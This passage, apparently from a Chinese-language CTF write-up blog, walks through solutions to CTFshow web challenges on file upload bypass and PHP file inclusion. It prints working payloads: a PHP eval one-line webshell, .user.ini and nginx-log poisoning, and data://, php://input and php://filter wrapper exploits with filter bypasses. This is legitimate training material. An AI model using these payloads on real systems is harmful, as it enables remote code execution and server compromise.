?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;webshell.png&lt;/code&gt; 后抓包，在BurpSuite中修改文件名后缀为 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821011210389.png&#34; alt=&#34;image-20250821011210389&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/upload/webshell/php&lt;/code&gt; 进行命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;# GET
/upload/webshell.php

# POST
1=ls ../
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821011003318.png&#34; alt=&#34;image-20250821011003318&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;# GET
/upload/webshell.php

# POST
1=tac ../flagaa.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821011049047.png&#34; alt=&#34;image-20250821011049047&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web169&#34;&gt;&lt;a href=&#34;#web169&#34; class=&#34;headerlink&#34; title=&#34;web169&#34;&gt;&lt;/a&gt;web169&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;查看源代码，上传文件类型为 &lt;code&gt;zip&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821165440610.png&#34; alt=&#34;image-20250821165440610&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;zip&lt;/code&gt; 文件并抓包，在 BurpSuite 中修改 &lt;code&gt;Content-Type:&lt;/code&gt; 类型为 &lt;code&gt;image/png&lt;/code&gt;&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改文件后缀名为 &lt;code&gt;1.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;User-Agent&lt;/code&gt; 添加一句话木马 &lt;code&gt;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Content-Type: image/png

# User-Agent
&amp;lt;?php @eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;修改后 &lt;code&gt;Send&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821165835463.png&#34; alt=&#34;image-20250821165835463&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;再上传一个文件后在BurpSuite中修改为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;auto_prepend_file=/var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821170042049.png&#34; alt=&#34;image-20250821170042049&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/1.php

#POST
a=system(&amp;quot;ls ../&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821170556956.png&#34; alt=&#34;image-20250821170556956&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/1.php

#POST
a=system(&amp;quot;tac ../flagaa.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821170652567.png&#34; alt=&#34;image-20250821170652567&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web170&#34;&gt;&lt;a href=&#34;#web170&#34; class=&#34;headerlink&#34; title=&#34;web170&#34;&gt;&lt;/a&gt;web170&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;查看源代码，上传文件类型为 &lt;code&gt;zip&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821165440610.png&#34; alt=&#34;image-20250821165440610&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;zip&lt;/code&gt; 文件并抓包，在 BurpSuite 中修改 &lt;code&gt;Content-Type:&lt;/code&gt; 类型为 &lt;code&gt;image/png&lt;/code&gt;&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改文件后缀名为 &lt;code&gt;1.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;User-Agent&lt;/code&gt; 添加一句话木马 &lt;code&gt;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Content-Type: image/png

# User-Agent
&amp;lt;?php @eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;修改后 &lt;code&gt;Send&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821172331063.png&#34; alt=&#34;image-20250821172331063&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;再上传一个文件后在BurpSuite中修改为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;auto_prepend_file=/var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821172439983.png&#34; alt=&#34;image-20250821172439983&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/1.php

#POST
a=system(&amp;quot;tac ../flagaa.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250821172606300.png&#34; alt=&#34;image-20250821172606300&#34; style=&#34;zoom:25%;&#34; /&gt;

 &lt;h1 id=&#34;web78&#34;&gt;&lt;a href=&#34;#web78&#34; class=&#34;headerlink&#34; title=&#34;web78&#34;&gt;&lt;/a&gt;web78&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文件包含&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801171241071.png&#34; alt=&#34;image-20250801171241071&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801171316898.png&#34; alt=&#34;image-20250801171316898&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;伪协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看目录下文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain,&amp;lt;?php system(&amp;quot;ls&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801172202035.png&#34; alt=&#34;image-20250801172202035&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain,&amp;lt;?php system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801171557675.png&#34; alt=&#34;image-20250801171557675&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nginx 的日志文件 &lt;code&gt;access.log&lt;/code&gt; 是一个文本文件，记录了用户请求信息。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果我们将一段PHP 代码写进日志，再通过 &lt;code&gt;include(&amp;#39;access.log&amp;#39;)&lt;/code&gt;，PHP 会执行其中的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们构造 POST 请求传参，实现 命令执行（RCE）。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Nginx 默认日志路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果服务器使用的是 Nginx，默认的日志路径通常是：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;访问日志（access log）：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;/var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误日志（error log）：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;/var/log/nginx/error.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这个路径来源于默认配置文件 &lt;code&gt;/etc/nginx/nginx.conf&lt;/code&gt; 中的一段：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;access_log  /var/log/nginx/access.log;
error_log   /var/log/nginx/error.log;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt; &amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Apache 默认日志路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果使用的是 Apache（httpd）：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;访问日志：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/apache2/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误日志：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/apache2/error.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;或在某些系统中（如 CentOS）：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/httpd/access_log
/var/log/httpd/error_log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;这些也都由 Apache 的配置文件 &lt;code&gt;/etc/httpd/conf/httpd.conf&lt;/code&gt; 或 &lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt; 决定。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;访问日志&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=../../../../var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801210238666.png&#34; alt=&#34;image-20250801210238666&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;构造 User-Agent 使其被写入 access.log（日志包含目标）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php eval($_POST[a]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801210209458.png&#34; alt=&#34;image-20250801210209458&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;post请求&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801210122212.png&#34; alt=&#34;image-20250801210122212&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;访问页面时，Nginx 会记录以下信息：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;访问的 URL&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IP 地址&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;请求方法（GET&amp;#x2F;POST）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;User-Agent&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Referer 等&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;日志格式长这样：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;127.0.0.1 - - [01/Aug/2025:12:34:56 +0800] &amp;quot;GET /index.php HTTP/1.1&amp;quot; 200 123 &amp;quot;-&amp;quot; &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;a&amp;#39;]); ?&amp;gt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个最后的 &lt;code&gt;&amp;lt;?php eval($_POST[&amp;#39;a&amp;#39;]); ?&amp;gt;&amp;quot;&lt;/code&gt; 就是在请求里写的 &lt;code&gt;User-Agent&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web79&#34;&gt;&lt;a href=&#34;#web79&#34; class=&#34;headerlink&#34; title=&#34;web79&#34;&gt;&lt;/a&gt;web79&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;换成大写 或者 利用短标签替换 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain,&amp;lt;?Php system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;


#甚至可以这样
?file=data://text/plain,&amp;lt;?PHP system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac ????????&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac f???.???&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac flag.ph?&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac f*&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801232241216.png&#34; alt=&#34;image-20250801232241216&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将 &lt;code&gt;&amp;lt;?php system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进行base64 编码后 &lt;code&gt;PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802011023891.png&#34; alt=&#34;image-20250802011023891&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?file=data://text/plain,&amp;lt;?= eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802002404164.png&#34; alt=&#34;image-20250802002404164&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解四&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;php://input&lt;/code&gt; 是一个PHP协议，允许把请求体当做PHP代码文件包含执行。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直接访问 &lt;code&gt;php://input&lt;/code&gt;，可以把HTTP请求的请求体当作PHP代码执行。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;这种解法需要在bp操作&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=Php://input
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802003525091.png&#34; alt=&#34;image-20250802003525091&#34; style=&#34;zoom: 33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?Php system(&amp;#39;tac flag.php&amp;#39;)?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802010453916.png&#34; alt=&#34;image-20250802010453916&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解五&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;日志包含&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=../../../../var/log/nginx/access.log


#User-Agent
&amp;lt;?= eval($_POST[a]); ?&amp;gt;


#POST
a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801212138779.png&#34; alt=&#34;image-20250801212138779&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
